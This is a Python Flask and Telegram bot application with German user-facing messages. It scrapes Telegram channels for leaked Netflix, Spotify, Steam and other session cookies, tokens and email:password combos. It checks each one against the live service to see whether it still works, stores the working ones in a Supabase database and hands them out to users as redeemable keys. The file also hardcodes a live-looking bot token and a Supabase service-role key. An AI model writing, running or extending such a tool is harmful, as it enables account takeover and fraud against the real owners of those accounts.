import threading
import time
import re
import json
import os
import random
import telebot
from flask import Flask, request, jsonify, render_template
import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor

app = Flask(__name__)

# CLOUD BOT TOKEN (GodDrop)
BOT_TOKEN = '8980059554:AAGi4797fL5HA4HIfFO74HFhEEmt6A2OoUQ'
CHAT_ID = '6584278242'

try:
    requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?offset=-1", timeout=5)
    time.sleep(2)
except: pass

bot = telebot.TeleBot(BOT_TOKEN)

SUPABASE_URL = "https://drrbibjafmqcxqhxswfy.supabase.co" 
SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRycmJpYmphZm1xY3hxaHhzd2Z5Iiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc5MzQ2NjQ2NiwiZXhwIjoyMTA5MDQyNDY2fQ.XElFDbLqZT_bbRP9EomuZlH7gbflUni46fvGvm9hleo"

def get_headers():
    return {"apikey": SUPABASE_KEY, "Authorization": f"Bearer {SUPABASE_KEY}", "Content-Type": "application/json", "Prefer": "return=representation"}

TELEGRAM_CHANNELS = [
    "freetohell", "Crackers_Official", "internettweaksforum", "netflix_disney_hotstar_nord", 
    "mrplan254", "DARKNET240", "PremiumAccounts_Free", "Combos", "Netflix_Cookies", 
    "Spotify_Premium", "FreeNetflixDaily", "Cookies_Netflix", "Netflix_Account_Drop", 
    "Free_Account_Drop", "NetflixCookiesFree", "NetflixFreebies", "accountsharing", 
    "streamingpartners", "Netflix_Drops", "Spotify_Accounts", "rtl_plus_free", 
    "disney_plus_accounts", "crunchyroll_free", "steam_accounts", "minecraft_accounts", 
    "chatgpt_accounts", "openai_accounts", "gaming_drops", "leaked_combos"
]

PATTERN = re.compile(
    r'(https?://(?:www\.)?(?:netflix|spotify|disneyplus|rtlplus|crunchyroll|steam|minecraft|openai|chatgpt)\.(?:com|de|net)/[^\s<"]+)|((?:NetflixId|SecureNetflixId|sp_dc|sp_key|token|session)=[^;\s]+)|([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}:[^\s]+)',
    re.IGNORECASE
)

def clean_link(link):
    return link.replace('</a>', '').replace('<br>', '').replace('"', '').strip()

def get_platform(item):
    item_lower = item.lower()
    if "netflix" in item_lower or "tv2" in item_lower or "browse" in item_lower: return "netflix"
    if "spotify" in item_lower or "sp_dc" in item_lower: return "spotify"
    if "disney" in item_lower: return "disney"
    if "rtl" in item_lower or "tvnow" in item_lower: return "rtl"
    if "crunchyroll" in item_lower: return "crunchyroll"
    if "steam" in item_lower: return "steam"
    if "minecraft" in item_lower or "mojang" in item_lower: return "minecraft"
    if "openai" in item_lower or "chatgpt" in item_lower: return "chatgpt"
    return "combo"

def test_item(item):
    if ':' in item and '@' in item: return True
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'}
    try:
        if item.startswith('http'):
            r = requests.get(item, headers=headers, allow_redirects=True, timeout=10)
            if 'login' in r.url.lower() or 'signin' in r.url.lower() or 'unsupported' in r.url.lower():
                return False
            return True
        else:
            headers['Cookie'] = item
            r = requests.get('https://www.netflix.com/browse', headers=headers, allow_redirects=True, timeout=10)
            if 'login' in r.url.lower(): return False
            return True
    except: return False

def build_telegram_msg(item, platform, key):
    msg = f"🚨 <b>{platform.upper()} FUND</b> 🚨\n\n"
    msg += f"🔑 <b>Key:</b> <code>{key}</code>\n"
    msg += f"🌐 <b>Einlösen:</b> <a href='https://multi-cloud-final.onrender.com'>Hier klicken</a>\n\n"
    
    if platform == "netflix" and "nftoken=" in item:
        try:
            token = item.split("nftoken=")[1].split("&")[0]
            pc_link = f"https://www.netflix.com/browse?nftoken={token}"
            mobile_link = f"https://www.netflix.com/browse?nftoken={token}&mobile=true"
            tv_link = f"https://www.netflix.com/tv2?nftoken={token}"
            
            msg += f"💻 <b>PC Browser:</b>\n<a href='{pc_link}'>PC-Link öffnen</a>\n\n"
            msg += f"📱 <b>Handy:</b>\n<a href='{mobile_link}'>Handy-Link öffnen</a>\n\n"
            msg += f"📺 <b>Smart TV:</b>\n<a href='{tv_link}'>TV-Link öffnen</a>\n"
        except:
            msg += f"🔗 <b>Link:</b> <a href='{item}'>Account öffnen</a>\n"

    elif ':' in item and '@' in item:
        email, password = item.split(':', 1)
        msg += f"📧 <b>E-Mail:</b> <code>{email}</code>\n"
        msg += f"🔒 <b>Passwort:</b> <code>{password}</code>\n\n"
        msg += f"📱 <b>Gerät:</b> Funktioniert auf <b>PC, Handy & TV</b> (einfach einloggen)."
        
    else:
        msg += f"🔗 <b>Direkt-Link:</b> <a href='{item}'>Account öffnen</a>\n"
        msg += f"📱 <b>Hinweis:</b> Funktioniert am besten im <b>PC Browser</b>."
        
    return msg

def scan_telegram(channel):
    found = []
    try:
        r = requests.get(f"https://t.me/s/{channel}", timeout=5, headers={'User-Agent': 'Mozilla/5.0'})
        for m in PATTERN.findall(r.text):
            link = clean_link(m[0] or m[1] or m[2])
            if link and test_item(link): found.append(link)
    except Exception: pass 
    return found

def grabber_loop():
    while True:
        found_raw = []
        with ThreadPoolExecutor(max_workers=15) as executor:
            results = executor.map(scan_telegram, TELEGRAM_CHANNELS)
            for res in results: found_raw.extend(res)
        
        found_raw = list(set(found_raw)) 
        
        if found_raw:
            for item in found_raw:
                check = requests.get(f"{SUPABASE_URL}/rest/v1/keys?data=eq.{item}", headers=get_headers())
                if check.status_code == 200 and not check.json():
                    platform = get_platform(item)
                    meta = {"email": "Login" if ':' in item else "Link", "password": None, "country": "Unknown", "plan": "Premium", "profiles": []}
                    newKey = 'CLM-' + os.urandom(4).hex().upper()
                    requests.post(f"{SUPABASE_URL}/rest/v1/keys", headers=get_headers(), json={"key": newKey, "data": item, "metadata": meta, "used": False, "platform": platform})
                    try: 
                        msg = build_telegram_msg(item, platform, newKey)
                        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": msg, "parse_mode": "HTML", "disable_web_page_preview": True})
                    except: pass
        time.sleep(60)

def bot_loop():
    @bot.message_handler(commands=['start', 'key'])
    def send_key(message):
        try:
            args = message.text.split()
            platform = args[1].lower() if len(args) > 1 else "netflix"
            r = requests.get(f"{SUPABASE_URL}/rest/v1/keys?data=not.is.null&used=eq.false&platform=eq.{platform}&limit=1", headers=get_headers())
            if r.status_code == 200 and r.json():
                bot.reply_to(message, f"Dein {platform.capitalize()} Key: `{r.json()[0]['key']}`\n\nLöse ihn ein: https://multi-cloud-final.onrender.com", parse_mode='Markdown')
            else: bot.reply_to(message, f"❌ Keine {platform.capitalize()} Accounts verfügbar.")
        except: pass
    bot.polling(non_stop=True)

threading.Thread(target=grabber_loop, daemon=True).start()
threading.Thread(target=bot_loop, daemon=True).start()

@app.route('/')
def home(): return render_template('index.html')

@app.route('/api/claim', methods=['POST'])
def claim():
    data = request.json
    key = data.get('key')
    r = requests.get(f"{SUPABASE_URL}/rest/v1/keys?key=eq.{key}&data=not.is.null", headers=get_headers())
    if r.status_code == 200 and r.json():
        k = r.json()[0]
        return jsonify({"success": True, "data": k['data'], "platform": k['platform']})
    return jsonify({"success": False, "msg": "Key ungültig oder nicht gefunden!"})

@app.route('/api/replace', methods=['POST'])
def replace():
    data = request.json
    old_key = data.get('key')
    current_platform = data.get('platform', 'netflix') 
    
    r = requests.get(f"{SUPABASE_URL}/rest/v1/keys?data=not.is.null&used=eq.false&platform=eq.{current_platform}&key=neq.{old_key}&limit=1", headers=get_headers())
    if r.status_code == 200 and r.json():
        new_acc = r.json()[0]
        new_link = new_acc['data']
        
        requests.patch(f"{SUPABASE_URL}/rest/v1/keys?key=eq.{old_key}", headers=get_headers(), json={"data": new_link, "platform": current_platform})
        requests.delete(f"{SUPABASE_URL}/rest/v1/keys?id=eq.{new_acc['id']}", headers=get_headers())
        
        return jsonify({"success": True, "data": new_link})
    
    return jsonify({"success": False, "msg": "Keine Ersatz-Accounts verfügbar!"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
